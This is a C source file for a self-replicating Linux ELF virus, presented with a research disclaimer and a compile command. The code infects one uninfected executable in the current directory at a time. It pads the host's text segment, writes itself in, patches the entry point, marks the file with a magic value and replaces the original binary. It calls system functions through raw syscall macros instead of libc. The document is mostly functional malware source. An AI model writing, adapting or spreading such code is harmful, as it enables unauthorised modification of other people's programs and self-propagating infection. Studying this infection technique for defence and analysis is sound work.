/*
 * Linux VIRUS - 12/19/08 Ryan O'Neill
 *
 * -= DISCLAIMER =-
 * This code is purely for research purposes and so that the reader may have a deeper understanding
 * of UNIX Virus infection within ELF executables. 
 *
 * Behavior:
 * The virus copies itself to the first uninfected executable that it has write permissions to, 
 * therefore the virus copies itself one executable at a time. The virus writes a bit of magic 
 * into each binary that it infects so that it knows not to re-infect it. The virus at present
 * only infects files within the current working directory, but can easily be modified.
 * 
 * This virus extends/creates a PAGE size padding at the end of the text segment within the host
 * executable, and copies itself into that location. The original entry point is patched to the
 * start of the parasite which returns control back to the host after its execution.
 * The code is position independent and eludes libc through syscall macros. 
 * 
 * Compile:
 * gcc virus.c -o virus -nostdlib
 *
 * <ryan@bitlackeys.com>
 *
 */


#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/fcntl.h>
#include <errno.h>
#include <elf.h>
#include <asm/unistd.h>
#include <asm/stat.h>

#define PAGE_SIZE 4096
#define BUF_SIZE 1024
#define TMP "vx.tmp"

void end_code(void);

unsigned long get_eip();
unsigned long old_e_entry;
void end_code(void);
void mirror_binary_with_parasite (unsigned int, unsigned char *, unsigned int,
				   struct stat, char *, unsigned long);

extern int myend;
extern int foobar;
extern int real_start;

_start() 
{
__asm__(".globl real_start\n"
	"real_start:\n"
	"pusha\n"
	"call do_main\n"
	"popa\n"
	"jmp myend\n");

}

do_main()
{
  
  struct linux_dirent
  {
          long d_ino;
          off_t d_off;
          unsigned short d_reclen;
          char d_name[];
  };

  char *host;
  char buf[BUF_SIZE];
  char cwd[2];
  struct linux_dirent *d;
  int bpos;
  int dd, nread;
  
  unsigned char *tp;
  int fd, i, c;
  char text_found;
  mode_t mode;

  struct stat st; 

  unsigned long address_of_main = get_eip() - ((char *)&foobar - (char *)&real_start);

  unsigned int parasite_size = (char *)&myend - (char *)&real_start;
  parasite_size += 7;
  
  unsigned long int leap_offset;
  unsigned long parasite_vaddr;
  unsigned int numbytes;
  
  Elf32_Shdr *s_hdr;
  Elf32_Ehdr *e_hdr;
  Elf32_Phdr *p_hdr;

  unsigned long text;
  int nc; 
  int magic = 32769;
  int m, md;
  text_found = 0;
  unsigned int after_insertion_offset;
  unsigned int end_of_text;
  
  char infected;

  cwd[0] = '.';
  cwd[1] = 0;
  
  dd = open (cwd, O_RDONLY | O_DIRECTORY);

  nread = getdents (dd, buf, BUF_SIZE);
  for (bpos = 0; bpos < nread;) {

    d = (struct linux_dirent *) (buf + bpos);
    bpos += d->d_reclen;
    
    host = d->d_name;
	
    if (host[0] == '.')   
	continue;

    if (host[0] == 'l')
	continue;

    fd = open (d->d_name, O_RDONLY); 
    
    stat(host, &st);
    char mem[st.st_size];
    
    infected = 0;
    c = read (fd, mem, st.st_size);
 
    e_hdr = (Elf32_Ehdr *) mem;
    if (e_hdr->e_ident[0] != 0x7f && strcmp (&e_hdr->e_ident[1], "ELF")) 
    {
    	   close (fd);
   	   continue;
    }
    else 
    {
    	p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
	for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
	{
		if (p_hdr->p_type == PT_LOAD)
		{
			if (p_hdr->p_flags == (PF_R | PF_X))
			{ 	
				md = open(d->d_name, O_RDONLY);
				unsigned int pt = (PAGE_SIZE - 4) - parasite_size;
				lseek(md, p_hdr->p_offset + p_hdr->p_filesz + pt, SEEK_SET);
				read(md, &m, sizeof(magic));
				if (m == magic)
					infected++; 
				close(md);
				break;
			}
		}
	}
    } 

     if (infected)
     {
	close(fd);
     	continue; 
     }
     else
     {
     	 p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
         for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) 
	 {
		if (text_found) 
		{
	  		p_hdr->p_offset += PAGE_SIZE;
			continue;
		}
		else 
		if (p_hdr->p_type == PT_LOAD) 
		{
	  		if (p_hdr->p_flags == (PF_R | PF_X)) 
			{
	    			text = p_hdr->p_vaddr;
			        parasite_vaddr = p_hdr->p_vaddr + p_hdr->p_filesz;
	    			old_e_entry = e_hdr->e_entry;
	    			e_hdr->e_entry = parasite_vaddr;
	    			end_of_text = p_hdr->p_offset + p_hdr->p_filesz;
			        p_hdr->p_filesz += parasite_size; 
			        p_hdr->p_memsz += parasite_size;
	    			text_found++;
	  		}
		}
	 }
    } 
    s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
    for (i = e_hdr->e_shnum; i-- > 0; s_hdr++) 
    {
    	  if (s_hdr->sh_offset >= end_of_text)
	 	 s_hdr->sh_offset += PAGE_SIZE;
	  else 
	  if (s_hdr->sh_size + s_hdr->sh_addr == parasite_vaddr)
	 	 s_hdr->sh_size += parasite_size;
    } 

      e_hdr->e_shoff += PAGE_SIZE;
      mirror_binary_with_parasite (parasite_size, mem, end_of_text, st, host, address_of_main);
      close (fd);
      goto done;
  }
      done:
      close (dd);
  }
 
void
mirror_binary_with_parasite (unsigned int psize, unsigned char *mem,
   unsigned int end_of_text, struct stat st, char *host, unsigned long address_of_main)
{
 
  int ofd;
  unsigned int c;
  int i, t = 0;
  int magic = 32769;
  
  char tmp[3];
  tmp[0] = '.'; 
  tmp[1] = 'v';
  tmp[2] = 0;
  
  char jmp_code[7];
 
  jmp_code[0] = '\x68'; /* push */
  jmp_code[1] = '\x00'; /* 00 	*/
  jmp_code[2] = '\x00'; /* 00	*/
  jmp_code[3] = '\x00'; /* 00	*/
  jmp_code[4] = '\x00'; /* 00	*/
  jmp_code[5] = '\xc3'; /* ret */
  jmp_code[6] = 0;
 
  int return_entry_start = 1;
  ofd = open (tmp, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);
  
  write (ofd, mem, end_of_text);
  *(unsigned long *) &jmp_code[1] = old_e_entry;
  write (ofd, (char *)address_of_main, psize - 7);
  write (ofd, jmp_code, 7);
  
  lseek (ofd, (PAGE_SIZE - 4) - psize, SEEK_CUR); 
  write (ofd, &magic, sizeof(magic));

  mem += end_of_text;
 
  unsigned int last_chunk = st.st_size - end_of_text;
  write (ofd, mem, last_chunk);
  rename (tmp, host);
  close (ofd);
 

}

unsigned long get_eip(void)
{
  __asm__("call foobar\n"
          ".globl foobar\n"
          "foobar:\n"
          "pop %eax");
}


#define __syscall0(type,name) \
type name(void) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name)); \
return(type)__res; \
}

#define __syscall1(type,name,type1,arg1) \
type name(type1 arg1) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
 : "0" (__NR_##name),"b" ((long)(arg1))); \
return(type)__res; \
}


#define __syscall2(type,name,type1,arg1,type2,arg2) \
type name(type1 arg1,type2 arg2) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
return(type)__res; \
}

#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
type name(type1 arg1,type2 arg2,type3 arg3) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                  "d" ((long)(arg3))); \
return(type)__res; \
}
#define __syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4) \
type name (type1 arg1, type2 arg2, type3 arg3, type4 arg4) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4))); \
return(type)__res; \
}

#define __syscall5(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
          type5,arg5) \
type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5))); \
return(type)__res; \
}
#define __syscall6(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
          type5,arg5,type6,arg6) \
type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5,type6 arg6) \
{ \
long __res; \
__asm__ volatile ("push %%ebp ; movl %%eax,%%ebp ; movl %1,%%eax ; int $0x80 ; pop %%ebp" \
        : "=a" (__res) \
        : "i" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5)), \
          "0" ((long)(arg6))); \
return(type),__res; \
}

__syscall1(void, exit, int, status);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
__syscall2(int, fstat, int, fildes, struct stat * , buf);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall1(int, close, int, fd);
__syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
__syscall3(int, read, int, fd, void *, buf, size_t, count);
__syscall2(int, stat, const char *, path, struct stat *, buf);
void end_code() {

__asm__(".globl myend\n"
	"myend:	     \n"
        "mov $1,%eax \n"
        "mov $0,%ebx \n"
	"int $0x80   \n"); 

}


